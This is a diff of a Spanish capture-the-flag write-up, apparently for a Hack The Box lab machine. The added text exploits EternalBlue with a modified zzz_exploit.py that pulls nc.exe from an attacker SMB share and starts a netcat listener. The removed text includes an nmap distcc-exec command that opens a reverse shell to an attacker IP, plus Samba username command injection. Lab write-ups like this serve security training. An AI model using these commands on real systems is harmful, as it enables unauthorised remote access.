@@ -42,53 +42,36 @@ Vemos que la primera opción, **AutoBlue**, es en python3.&#x20;
 
 ![](../../.gitbook/assets/google\_blue2.png)
 
-![](../../.gitbook/assets/explotacion.png)
+Nos descargamos el exploit y lanzamos el checker para verificar si es vulnerable.
 
-Comprobamos que nos hemos conectado y que estamos en la maquina objetivo como **root**.
+![](../../.gitbook/assets/checker.png)
 
-No tenemos pues que escalar privilegios. Hacemos un tratamiento de la tty con la siguiente secuencia de comandos:
+Vemos que es vulnerable. Nos abrimos el fichero zzz\_exploit.py y lo modificamos para crearnos una reverse shell.
+
+![](../../.gitbook/assets/blue1.png)
+
+Le decimos que ejecute nc.exe, que se encuentra en nuestra maquina en un recurso compartido llamado smbFolder y nos ejecute la shell inversa.
+
+Ahora hay que hacer 3 cosas:
+
+Primero localizar el fichero nc.exe y crear un recurso compartido con impacket-smbserver:
 
 ```
-script /dev/null -c bash
-# CTLR + Z para poner en segundo plano la terminal
-stty raw -echo; fg
-reset xterm
-export TERM=xterm
-export shell=bash
-stty rows 51 columns 189
+impacket-smbserver smbFolder $(pwd) -smb2support
 ```
 
-A continuación obtenemos las flags de user y de root.
+Luego ponernos a la escucha por el puerto 443.
 
-![](../../.gitbook/assets/explotacion2.png)
+```
+sudo rlwrap nc -nlvp 443
+```
+
+Y por último lanzar el exploit
+
+![](../../.gitbook/assets/exploit3.png)
+
+Vemos abajo a la izquierda que hemos comprometido la máquina. La maquina es muy limitada y no nos da comandos como **whoami** o **id**. Pero hemos entrado com permisos de administrador ya que nos permite leer ambas flags por lo que no es necesario escalar privilegios.
+
+![](../../.gitbook/assets/flags.png)
 
 Y damos la máquina por terminada.
-
-## Otras formas de explotación
-
-### Con SMBCLIENT
-
-Buscamos exploit con searchexploit y encontramos uno de metasploit.&#x20;
-
-![](../../.gitbook/assets/msf.png)
-
-Lo examinamos y vemos que lanza un comando como username anteponiendo **nohup** en el usuario y ademas tiene que ser SBMv1.
-
-![](../../.gitbook/assets/exp\_msf.png)
-
-Podemos entonces lanzar lo mismo con smbclient.
-
-![](../../.gitbook/assets/explotacion3.png)
-
-### Explotando DISTCCC puerto 3632
-
-Buscamos en Google "distccc exploit" y observamos que aparece en **hacktricks**.
-
-![](../../.gitbook/assets/hacktricks.png)
-
-Probamos con nmap como nos indica el articulo. En el comando ponemos la shell inversa.
-
-```
-nmap -p3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc 10.10.14.31 443 -e /bin/sh'"
-```
-
